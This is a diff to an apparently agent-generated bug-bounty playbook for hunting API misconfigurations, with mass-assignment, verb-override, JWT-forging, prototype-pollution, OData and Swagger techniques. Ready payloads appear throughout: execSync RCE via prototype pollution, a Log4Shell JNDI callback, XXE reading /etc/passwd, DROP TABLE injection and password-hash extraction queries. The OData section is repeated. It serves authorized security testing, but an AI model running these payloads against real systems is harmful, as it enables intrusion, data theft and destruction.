@@ -4,11 +4,11 @@ description: "Hunt mass assignment, verb tampering, prototype pollution and sche
 agent_created: true
 ---
 
-# API misconfiguration hunting — unified methodology
+# API misconfiguration hunting — unified skill
 
-> **Unified skill.** Built from 2 upstream skills across cbh, hunting. Full originals are in `references/upstream-*.md`; the deduplicated union is in `references/unified-method.md`.
+> **Complete merged skill.** Everything from 2 upstream skills across cbh, hunting is contained in this file. Unmodified originals remain in `references/` for provenance only.
 
-## Unified upstream methodology (deduplicated)
+## Unified upstream methodology (complete, deduplicated)
 
 ### Discovery and hunting method
 
@@ -18,7 +18,14 @@ agent_created: true
 - For every `GET /api/<resource>/<id>` (or list response), diff the returned JSON keys against the fields the UI actually renders. Each extra key is a candidate hidden/mass-assignable parameter: `id`, `isAdmin`, `role`, `email_verified`, `created_by`, `price`, `total_stay_price`, `blocked`, `org_id`, `tenant_id`, `owner_id`.
 - Enumerate supported **methods** with `OPTIONS` and an Intruder verb list (`GET POST PUT PATCH DELETE HEAD TRACE`). API8:2023 explicitly calls out unnecessary verbs as misconfiguration. Note verb-level authz asymmetry: a `POST /admin/roles` may be blocked while `GET` (or a bogus verb like `POSTX`) with the same params is not.
 - Try **method-override headers** when the proxy only allowlists verbs: `X-HTTP-Method-Override: PATCH`, `X-Method-Override: DELETE`, `X-Original-URL: /admin/...`, `X-Rewrite-URL: /admin/...`, `_method=PATCH` in form bodies. Some stacks apply authz to the outer verb but route on the override.
-- Provoke **content-type differentials** (API8): resend the same JSON request as `application/xml`, `application/x-www-form-urlencoded`, `text/plain`, `multipart/form-data`, and with `+json` suffixes (`applica
+- Provoke **content-type differentials** (API8): resend the same JSON request as `application/xml`, `application/x-www-form-urlencoded`, `text/plain`, `multipart/form-data`, and with `+json` suffixes (`application/merge-patch+json`). Watch for one parser being strict and another injecting/binding unchecked fields.
+- Framework binding fingerprints to look for in headers/errors: Spring `DataBinder`/`@ModelAttribute`, ASP.NET MVC autobinding, Rails `attr_accessible`/strong params, Laravel Eloquent `$fillable`/`$guarded`, Mongoose schema, Jackson/GSON/Flexjson mappers. These reveal *which* property names are bindable by design.
+- Favor `PATCH`/`PUT` over `POST` for write probes — partial-update handlers are the most common auto-binding sinks. Also test nested objects and array syntax (`address[isAdmin]=true`, `user[role]=admin`) that frameworks recursively bind.
+- Check the **shadow API inventory** (API9): unversioned `/v1`, `/beta`, `/internal`, `/admin`, `/debug` paths; old API versions usually lack the field allowlist added to the current one.
+- Use **response-schema allowlisting as the oracle**: if the API documents a schema (Swagger/OpenAPI/JSON Schema), compare every response against it. Fields present in the response but absent from the schema are exactly the BOPLA "excessive exposure" candidates; fields accepted in requests but absent from the schema are the mass-assignment candidates.
+- Probe **pagination/filter/sort parameters** for silent internal-field access: `?sort=isAdmin`, `?fields=password,role`, `?expand=owner`, `?filter[verified]=false`, `?include=internalNotes`. Many frameworks let these reach the ORM unchecked, exposing or mutating properties the UI never mentions.
+- Watch for **out-of-band side effects** as the only symptom of a bound field: a changed `notifyEmail`/`webhookUrl` causes a Collaborator callback; a flipped `verified` sends a welcome email. Side-effect analysis is required when the target property is not echoed in the response (OWASP BOPLA guidance).
+- Look for verbose errors/stack traces (`API8`): force invalid JSON, wrong field types (string where int expected), huge field values — framework exceptions often print the internal DTO/entity class and its full field list, which *is* the mass-assignment wordlist.
 
 ### Techniques, payloads and bypasses
 
@@ -32,7 +39,14 @@ agent_created: true
   A `201 Created` + order-confirmation redirect proves the bound field changed business state.
 - OWASP BOPLA scenario shapes worth mirroring: `{"approved":true,"comment":"...","total_stay_price":"$1,000,000"}` on `POST /api/host/approve_booking` (unauthorized price field) and `{"description":"...","blocked":false}` on `PUT /api/video/update_video` (unlock own censored content).
 - **Framework-homeword field names** from the OWASP Mass Assignment Cheat Sheet: Spring `isAdmin`, Laravel `is_admin`, Mongoose `isAdmin`/`protect:true`, Rails `:admin`, plus `role`, `verified`, `permissions`, `email_verified`, `owner_id`, `account_balance`, `credit`. Always include the framework's native naming convention (`isAdmin` vs `is_admin` vs `admin`).
-- **Type confusion in binding**: booleans accept `true`, `"true"`, `1`, `"1"`, `yes`; roles accept `["admin"]` or `{"role":"admin"}`; try arrays/objects where scalars are expe
+- **Type confusion in binding**: booleans accept `true`, `"true"`, `1`, `"1"`, `yes`; roles accept `["admin"]` or `{"role":"admin"}`; try arrays/objects where scalars are expected to confuse a loosely typed binder. `{"role[]":"admin"}` and `{"role[0]":"admin"}` cover PHP/Rails-style nested binding.
+- **Mass assignment via query string on JSON endpoints**: some frameworks bind *both* body and query params (`?isAdmin=true` on a `POST` with JSON body). Send the hidden field in every location: body, query, cookie, and multipart part.
+- **Verb/override bypass chain**: `POST /admin/roles` → 403; replay as `GET /admin/roles?username=attacker&action=upgrade`, or `POST` + `X-HTTP-Method-Override: GET`, or `POSTX` verb. The PortSwigger method-based-access-control lab demonstrates exactly this outer-vs-inner verb mismatch.
+- **Content-type bypass of a JSON allowlist**: if `application/json` is validated but `application/x-www-form-urlencoded` is parsed by a different middleware, send `isAdmin=true` form-encoded — validation skipped, binder still populates the DTO. Use the Content Type Converter BApp to reshape requests quickly.
+- **Error-driven property discovery**: a malformed value for an unknown field sometimes returns `Unrecognized field "foo"` (Jackson) vs. silently binding it. Diff those messages — the error text is a schema oracle and is itself an API8 information-disclosure finding.
+- **JNDI-in-header misconfig probe** (OWASP API8 scenario #1): inject `${jndi:ldap://<collab>/a}` into `X-Api-Version`, `X-Forwarded-For`, `User-Agent`, `X-Real-IP` on a health/debug endpoint; a Collaborator callback indicates an unsandboxed logging utility (Log4Shell-class misconfiguration).
+- **Cache-control misconfig** (OWASP API8 scenario #2): `GET /dm/user_updates.json?conversation_id=...&cursor=...` with no `Cache-Control`/`Pragma` → private messages cached in shared/browser caches. Check response headers on every JSON read endpoint.
+- Combine with a schema source: `jq '.components.schemas | keys[]' swagger.json` and `jq '.paths | keys[]'` give both field names and endpoints; feed the former to Param Miner/Intruder as a mass-assignment wordlist.
 
 ### OData $filter / $select / $expand WAF-Blacklist Bypass (2024-2026 surface)
 
@@ -78,7 +92,9 @@ Mixed-case operators (`Eq`, `EQ`) and obscure ones (`substringof`, `tolower`, `c
 - Guard against self-inflicted bugs: if the field only affects data you own and yields no privilege/tenant/business impact, it is often accepted-risk or informational. Apply the triage rule: show unauthorized access to another object/role, or a real monetary effect.
 - Do not report a permissive `Access-Control-Allow-Origin` or an extra response field alone. Demonstrate credentialed cross-origin read (CORS skill) or a sensitive property that should not be readable (BOPLA read side).
 - Watch for **false-positive field reflection**: a field echoed in the response does not prove it was *bound*. Test persistence across a new `GET`; verify the value survives a round trip and is not merely a client-supplied echo.
-- Watch for **false-negative silent filtering**: if a valida
+- Watch for **false-negative silent filtering**: if a validated framework strips the field before binding, no error appears. Use the type-confusion and nested-binding variants above before concluding "not vulnerable."
+- Verb-tampering positives must be proven functionally: a `200` from a bogus verb with no privilege change (e.g., just echoing data you already can read) is misconfiguration, not authz bypass. Show that the forbidden action completed.
+- Safety: target low-value objects when fuzzing verbs (a `DELETE` on a real record is destructive); use a throwaway object you created. Keep mass-assignment probes on your own account until exploitation is confirmed.
 
 ### Escalation and related chains
 
@@ -110,16 +126,387 @@ Mixed-case operators (`Eq`, `EQ`) and obscure ones (`substringof`, `tolower`, `c
 - **`security-arsenal`** — Load the JWT Attack Payloads section (alg=none, kid path traversal, JWK injection, embedded JWK) and the Mass-Assignment Field Wordlist (`is_admin`, `role`, `verified`, `permissions`, `org_id`, `tenant_id`).
 - **`triage-validation`** — Apply the Server-Policy-vs-State gate: a permissive CORS header alone is informational; demonstrate actual cross-origin credentialed read of sensitive data before reporting.
 
+### Sources and related reading
+
+### D. Sources — numbered list of URLs you actually fetched
+
+1. https://api-security.owasp.org/editions/2023/en/0x11-t10/
+2. https://github.com/OWASP/API-Security/blob/master/editions/2023/en/0xa8-security-misconfiguration.md
+3. https://github.com/OWASP/API-Security/blob/master/editions/2023/en/0xa3-broken-object-property-level-authorization.md
+4. https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html
+5. https://portswigger.net/web-security/api-testing
+6. https://portswigger.net/web-security/api-testing/lab-exploiting-mass-assignment-vulnerability
+7. https://learn.microsoft.com/en-us/azure/api-management/mitigate-owasp-api-threats
+
+### Additional notes
+
+### Mass Assignment
+
+```javascript
+User.update(req.body)  // body has {"role": "admin"} → privilege escalation
+```
+
+### JWT None Algorithm
+
+```python
+header = {"alg": "none", "typ": "JWT"}
+payload = {"sub": 1, "role": "admin"}
+token = base64(header) + "." + base64(payload) + "."  # no signature
+```
+
+### JWT RS256 → HS256 Algorithm Confusion
+
+```python
+# Get server's public key from /.well-known/jwks.json
+# Sign token with public key as HMAC secret
+token = jwt.encode({"sub": "admin", "role": "admin"}, pub_key, algorithm="HS256")
+# Server uses RS256 key as HS256 secret → accepts it
+```
+
+### Prototype Pollution
+
+```javascript
+// Server-side — Node.js merge without protection
+{"__proto__": {"admin": true}}
+{"constructor": {"prototype": {"admin": true}}}
+// URL: ?__proto__[isAdmin]=true&__proto__[role]=superadmin
+```
+
+For server-side prototype pollution, hunt for an object merge primitive first, then a sink. Favor
+JSON/object update endpoints such as profile, address, preferences, settings, cart, admin job, import,
+or webhook configuration. Do not stop at a 200 response to `__proto__`; prove that polluted prototype
+state reaches a later operation.
+
+Hunt sequence:
+
+1. **Find an object-update endpoint.** Prefer endpoints that accept many named fields or JSON objects.
+   Try both JSON and form encodings when the app accepts forms. Include CSRF/session fields when needed.
+2. **Pollute harmless marker properties.** Send variants such as:
+
+```
+{"__proto__":{"polluted":"pp-1337"}}
+{"constructor":{"prototype":{"polluted":"pp-1337"}}}
+__proto__[polluted]=pp-1337
+constructor[prototype][polluted]=pp-1337
+```
+
+3. **Trigger a separate sink.** After pollution, request account/profile/admin/job/export/search/render
+   endpoints and compare with baseline. Strong signals include changed JSON defaults, unexpected fields,
+   server errors mentioning object properties, changed job output, template/render errors, or command/job
+   behavior changes.
+4. **Escalate only through learned sinks.** Candidate properties depend on the sink:
+
+```
+{"__proto__":{"json spaces":10}}
+{"__proto__":{"status":555}}
+{"__proto__":{"isAdmin":true,"role":"admin"}}
+{"__proto__":{"shell":"/bin/bash","argv0":"node","NODE_OPTIONS":"--inspect"}}
+{"__proto__":{"execArgv":["--eval","process.mainModule.require('child_process').execSync('id')"]}}
+```
+
+5. **For exfiltration labs or real impact, prefer non-destructive proof.** If an admin job, diagnostic,
+   export, or rendering endpoint consumes polluted defaults, use a marker or environment/secret read only
+   when authorized. In production, stop at a controlled marker unless scope explicitly permits data access.
+
+### Server-Side Parameter Pollution in Backend URL / REST URL Construction
+
+Use this when a frontend form or endpoint appears to call a server-side API on your behalf
+(password reset, account lookup, profile fetch, product lookup, stock check, search). The bug is not
+ordinary client-side query pollution. The server takes your input and interpolates it into a backend
+URL path or query string, such as:
+
+```
+/api/internal/users/<username>/field/email
+/api/users/<id>
+/api/users?username=<username>&field=email
+```
+
+Hunt sequence:
+
+1. **Find the flow and read the client request.** Fetch the page and any referenced JavaScript. Look
+   for form actions, `fetch(...)`, hidden CSRF fields, and the exact parameter name the browser sends.
+   If there is a reset/account form, test known usernames first to learn the normal success/error shape.
+2. **Determine whether input lands in a backend path or query.** Send URL metacharacters in the input:
+   `#`, `?`, `&x=y`, `/`, `../`, and encoded forms `%23`, `%3f`, `%26x=y`, `%2f`, `%2e%2e%2f`.
+   Distinct errors such as `Invalid route`, `API definition`, `unsupported field`, or changed returned
+   fields mean your value is being interpreted by a server-side URL router, not merely validated as text.
+3. **Use path traversal to move inside the server-side URL.** If `username/../other-user` changes the
+   referenced account, the input is in a REST path segment. Then try appending route fragments such as
+   `/field/email`, `/field/id`, `/field/username`, `/field/passwordResetToken`, and terminate the rest
+   of the original backend path with `#` or `%23` when the backend URL parser honors fragments.
+4. **Discover API documentation from errors.** When an error says to consult the API definition, probe
+   common documentation/spec paths: `/openapi.json`, `/swagger.json`, `/api-docs`, `/api/swagger.json`,
+   `/swagger/v1/swagger.json`, `/v3/api-docs`, and path-traversal variants that attempt to reach the
+   spec from the vulnerable backend route. A spec or descriptive route error tells you valid resources
+   and field names.
+5. **Exploit only to prove impact.** For password reset/account lookup flows, the strongest proof is a
+   sensitive field such as a reset token or secret for another user, then using that token in the normal
+   application flow to complete account takeover. Do not stop at `Invalid route`; use errors as routing
+   feedback.
+
+Payload patterns to try, adapted to the observed parameter name:
+
+```
+username=administrator%23
+username=administrator%3f
+username=administrator%2f..%2fvictimuser
+username=administrator/../victimuser
+username=administrator/field/email%23
+username=administrator/field/id%23
+username=administrator/field/passwordResetToken%23
+username=administrator%2ffield%2fpasswordResetToken%23
+```
+
+### CORS Exploitation
+
+```bash
+# Test: reflected origin + credentials
+curl -s -I -H "Origin: https://evil.com" https://target.com/api/user/me
+# If: Access-Control-Allow-Origin: https://evil.com + Access-Control-Allow-Credentials: true
+# → CRITICAL: attacker reads credentialed responses
+```
+
+---
+
+### NSwag / Swagger / OpenAPI Spec Exposure (2024-2026 surface)
+
+NSwag is the Swagger/OpenAPI toolchain for ASP.NET Core. Default routes (`/swagger`, `/swagger/v1/swagger.json`, `/swagger/index.html`) ship enabled in many .NET 6/7/8 projects and developers leave them on in production. The exposed spec discloses every endpoint, HTTP methods, parameter names + types + formats + max-lengths, models, validation rules — a complete attack-map in JSON.
+
+### Default discovery paths (cross-references `web2-recon`)
+
+```
+# NSwag / Swashbuckle (ASP.NET Core)
+/swagger, /swagger/index.html, /swagger/v1/swagger.json, /swagger/v2/swagger.json, /swagger/v3/swagger.json
+/swagger-ui, /swagger-ui/, /swagger-ui.html, /api-docs
+/nswag, /nswag/index.html, /api/swagger, /api/swagger.json, /api/openapi.json
+
+# Generic OpenAPI
+/openapi, /openapi.json, /openapi.yaml, /.well-known/openapi.json
+
+# Java / Spring (Springfox / springdoc)
+/v2/api-docs, /v3/api-docs, /v3/api-docs.yaml, /swagger-resources
+
+# Python (FastAPI / Connexion)
+/docs, /redoc, /openapi.json
+
+# Quarkus
+/q/openapi, /q/swagger-ui
+
+# GraphQL adjacent
+/graphql, /graphiql, /playground, /altair, /voyager
+```
+
+Tools: `kiterunner` natively eats OpenAPI; `sj` (Swagger Jacker), `apidetector`, `XSSwagger`.
+
+### Disclosed cases
+
+- **CVE-2018-25031** — Swagger UI ≤ 4.1.2 spec-injection via URL parameter; affects org.webjars:swagger-ui broadly (embedded in Swashbuckle and NSwag bundles).
+- **Swagger UI DOM XSS (3.14.1 → 3.38.0)** — outdated bundled DOMPurify + remote-spec-load → arbitrary JS in victim browser ([Vidoc Security Lab writeup](https://blog.vidocsecurity.com/blog/hacking-swagger-ui-from-xss-to-account-takeovers), [PortSwigger Daily Swig](https://portswigger.net/daily-swig/widespread-swagger-ui-library-vulnerability-leads-to-dom-xss-attacks)). Reported live on PayPal, Atlassian, Microsoft, GitLab, Yahoo.
+- **HackerOne #3124103** — U.S. Department of Defense, Swagger UI Injection (May 2025).
+- **HackerOne #2534300** — Ionity GmbH, HTML injection in Swagger UI.
+- **HackerOne #1656650** — Reflected XSS via Swagger UI `url=` parameter.
+- **CloudSEK threat-intel (2024)** — actors abuse exposed `swagger-ui` to invoke a verified-business WhatsApp send-message endpoint, impersonating the company to its customers. 6,000+ exposed Swagger UI instances on Shodan at time of writing. ([CloudSEK report](https://www.cloudsek.com/threatintelligence/threat-actors-use-exposed-swagger-ui-to-misuse-a-companys-endpoints-and-target-customers))
+- **CVE-2023-38337** — `rswag` (Ruby Swagger toolchain) directory traversal — reminder that the spec endpoint is itself an attack surface.
+
+### Detection checklist
+
+1. httpx-probe every path above across the full subdomain set; flag 200 with `Content-Type: application/json` AND body matching `"swagger"` or `"openapi"`.
+2. For every hit: `jq '.paths | keys' swagger.json` → feed to kiterunner / Autorize.
+3. `jq '.components.schemas' swagger.json` → mass-assignment field candidates.
+4. Banner the Swagger UI HTML for version string; map to the CVE-2018-25031 / DOM-XSS table.
+5. Test `?configUrl=` and `?url=` parameter handling on every Swagger UI hit.
+
+---
+
+### Attack class 1 — Boolean-logic blind extraction via `startswith` / `substringof`
+
+```
+GET /_api/data/contacts?$filter=startswith(adx_identity_passwordhash,'a')
+GET /_api/data/contacts?$filter=startswith(adx_identity_passwordhash,'aa')
+```
+
+Iterate prefix character-by-character; cardinality of the response (or `@odata.count`) is the boolean oracle that confirms the prefix is correct. No SQLi engine needed, no `'`/`--` characters — the WAF sees only legitimate OData keywords. Extracted Microsoft Dynamics 365 / Power Apps Portals **password hashes, names, emails, addresses, financial data** in Dec 2023; Microsoft patched May 2024. ([Stratus Security writeup](https://www.stratussecurity.com/post/critical-microsoft-365-vulnerability), [The Hacker News coverage Jan 2025](https://thehackernews.com/2025/01/severe-security-flaws-patched-in.html))
+
+### Attack class 5 — OData → real SQLi when library passes filter raw
+
+```
+$filter=Name eq 'x'); DROP TABLE Users--'
+```
+
+Only triggers when the OData layer string-concatenates into SQL instead of using LINQ. Documented in [OData/WebApi Issue #2352](https://github.com/OData/WebApi/issues/2352). The XML-deserialisation variant: **CVE-2019-17554** (Apache Olingo OData 4.0.0-4.6.0, XXE via `<!DOCTYPE foo [<!ENTITY x SYSTEM "file:///etc/passwd">]>` in `application/xml` body, CVSS 7.5). DoS variant: **CVE-2018-8269** (Microsoft.Data.OData deep `$filter` recursion → stack overflow).
+
+### Bonus — `$expand` navigation-property IDOR
+
+```
+GET /Orders?$expand=Customer($expand=PaymentMethods($expand=Card))
+```
+
+Authorisation decorators applied to top-level entity sets; the engine joins along navigation properties without re-checking ACL on the joined entity. Same root cause as the 2021 PowerApps Portals 38M-record mass leak ([UpGuard writeup](https://www.upguard.com/breaches/power-apps)).
+
+### Detection heuristics
+
+- Response headers: `OData-Version: 4.0` / `DataServiceVersion: 3.0`; URL paths `/_api/`, `/odata/`, `/_vti_bin/`, `/api/data/v9.x/`, `/sap/opu/odata/`.
+- Try `$metadata` → if anonymous, the full schema (entity sets, navigation properties, function imports) is yours.
+- Probe each entity set with `$filter=1 eq 1`, `$top=1`, `$select=*`, then `$orderby=<column-you-shouldnt-see>` for column-level ACL.
+- Send the same payload three ways (`$filter=`, `%24filter=`, `%2524filter=`) and through `$batch` — divergent WAF behaviour confirms the parser-discrepancy bug.
+
+---
+
+## Companion methodology (complete, deduplicated)
+
+Full text of every non-SKILL.md methodology document from the contributing skills.
+
+### Companion: hunting / references/techniques.md
+
+# api-misconfig — Technique reference
+
+Moved out of `SKILL.md` to keep the main playbook lean. Load this file when you need concrete technique.
+
+---
+
+## OData $filter / $select / $expand WAF-Blacklist Bypass (2024-2026 surface)
+
+
+
+OData (Open Data Protocol) is the query layer behind **SharePoint, Microsoft Dynamics 365 / Power Platform, SAP NetWeaver Gateway / Fiori,** and any ASP.NET WebAPI project using `Microsoft.AspNetCore.OData`. It exposes SQL-shaped query operators (`eq`, `ne`, `and`, `or`, `substringof`, `startswith`, `tolower`, `concat`, `replace`) that look SQL-ish but are NOT SQL — meaning keyword-blacklist WAFs routinely fail open on OData traffic.
+
+
+
+### Attack class 1 — Boolean-logic blind extraction via `startswith` / `substringof`
+
+
+
+```
+
+GET /_api/data/contacts?$filter=startswith(adx_identity_passwordhash,'a')
+
+GET /_api/data/contacts?$filter=startswith(adx_identity_passwordhash,'aa')
+
+```
+
+
+
+Iterate prefix character-by-character; cardinality of the response (or `@odata.count`) is the boolean oracle that confirms the prefix is correct. No SQLi engine needed, no `'`/`--` characters — the WAF sees only legitimate OData keywords. Extracted Microsoft Dynamics 365 / Power Apps Portals **password hashes, names, emails, addresses, financial data** in Dec 2023; Microsoft patched May 2024. ([Stratus Security writeup](https://www.stratussecurity.com/post/critical-microsoft-365-vulnerability), [The Hacker News coverage Jan 2025](https://thehackernews.com/2025/01/severe-security-flaws-patched-in.html))
+
+
+
+### Attack class 2 — `$orderby` / `$select` column-disclosure bypass
+
+
+
+```
+
+GET /api/data/v9.0/contacts?$orderby=emailaddress1 desc&$select=fullname
+
+```
+
+
+
+`$orderby` accepts column names the user has no `$select` permission for, but the engine still sorts on them — the returned order leaks the protected column. Column-level ACLs are enforced on the projection (`$select`) but NOT on `$orderby` / `$filter` — same protected column, different code path. Second Stratus finding in the same Dynamics 365 disclosure; "more dangerous than the first because it directly returned the data" per Stratus.
+
+
+
+### Attack class 3 — `$batch` multipart/mixed → per-request WAF signatures miss sub-operations
+
+
+
+```
+
+POST /odata/$batch  Content-Type: multipart/mixed; boundary=batch_1
+
+--batch_1
+
+Content-Type: application/http
+
+GET Users?$filter=1 eq 1 HTTP/1.1
+
+--batch_1--
+
+```
+
+
+
+WAFs that scan only the outer request body (or that don't natively parse `multipart/mixed`) skip every inner operation. ModSecurity refused `multipart/mixed` historically ([Issue #3296](https://github.com/owasp-modsecurity/ModSecurity/issues/3296)); F5 added native batch parsing only in Advanced WAF v16.1 ([F5 SAP-Fiori advisory](https://www.f5.com/company/blog/securing-sap-fiori-http-batched-requests-odata-with-f5-advance)). The 2025 WAFFLED paper ([arXiv 2503.10846](https://arxiv.org/html/2503.10846v1)) generalises the parsing-discrepancy bypass class across 5 major WAFs.
+
+
+
+### Attack class 4 — Encoded / non-canonical operator → keyword-blacklist bypass
+
+
+
+```
+
+GET /api?%24filter=Name%20eq%20'x'%20or%201%20eq%201   # URL-encoded $
+
+GET /api?%2524filter=...                                # double-encoded
+
+GET /Users(1)/$value                                    # path-segment style
+
+```
+
+
+
+Mixed-case operators (`Eq`, `EQ`) and obscure ones (`substringof`, `tolower`, `concat`, `replace`) look unlike `SELECT`/`UNION` so SQLi-keyword signatures never fire. WAFs that key on the literal string `$filter` see neither form — but the OData server normalises both before evaluating the predicate. Documented since Kalra Black Hat AD 2012; canonical OData-vs-WAF impedance mismatch. ([OWASP Double Encoding](https://owasp.org/www-community/Double_Encoding))
+
+
+
+### Attack class 5 — OData → real SQLi when library passes filter raw
+
+
+
+```
+
+$filter=Name eq 'x'); DROP TABLE Users--'
+
+```
+
+
+
+Only triggers when the OData layer string-concatenates into SQL instead of using LINQ. Documented in [OData/WebApi Issue #2352](https://github.com/OData/WebApi/issues/2352). The XML-deserialisation variant: **CVE-2019-17554** (Apache Olingo OData 4.0.0-4.6.0, XXE via `<!DOCTYPE foo [<!ENTITY x SYSTEM "file:///etc/passwd">]>` in `application/xml` body, CVSS 7.5). DoS variant: **CVE-2018-8269** (Microsoft.Data.OData deep `$filter` recursion → stack overflow).
+
+
+
+### Bonus — `$expand` navigation-property IDOR
+
+
+
+```
+
+GET /Orders?$expand=Customer($expand=PaymentMethods($expand=Card))
+
+```
+
+
+
+Authorisation decorators applied to top-level entity sets; the engine joins along navigation properties without re-checking ACL on the joined entity. Same root cause as the 2021 PowerApps Portals 38M-record mass leak ([UpGuard writeup](https://www.upguard.com/breaches/power-apps)).
+
+
+
+### Detection heuristics
+
+
+
+- Response headers: `OData-Version: 4.0` / `DataServiceVersion: 3.0`; URL paths `/_api/`, `/odata/`, `/_vti_bin/`, `/api/data/v9.x/`, `/sap/opu/odata/`.
+
+- Try `$metadata` → if anonymous, the full schema (entity sets, navigation properties, function imports) is yours.
+
+- Probe each entity set with `$filter=1 eq 1`, `$top=1`, `$select=*`, then `$orderby=<column-you-shouldnt-see>` for column-level ACL.
+
+- Send the same payload three ways (`$filter=`, `%24filter=`, `%2524filter=`) and through `$batch` — divergent WAF behaviour confirms the parser-discrepancy bug.
+
+
+
+---
+
 ## Source skills merged into this topic
 
 - `hunting` — `api-misconfig`
 - `cbh` — `hunt-api-misconfig`
 
-## References
+## Provenance
 
-- `references/unified-method.md` — complete deduplicated union of all upstream sections
-- `references/upstream-*.md` — full original SKILL.md from each contributing repo
-- `references/upstream-assets/` — 1 companion files (payload/technique references, scripts, validators and schemas) from the contributing skills
-- `references/unified-method.md` — includes 1 merged companion methodology documents
+- `references/unified-method.md` — same deduplicated union as this file, for tooling
+- `references/upstream-*.md` — unmodified original SKILL.md from each repo
+- `references/upstream-assets/` — 1 companion files
 - `../../upstream/` — complete unmodified archives of all five source repositories
 - `bbhunt-methodology` — orchestrator, state machine and class router
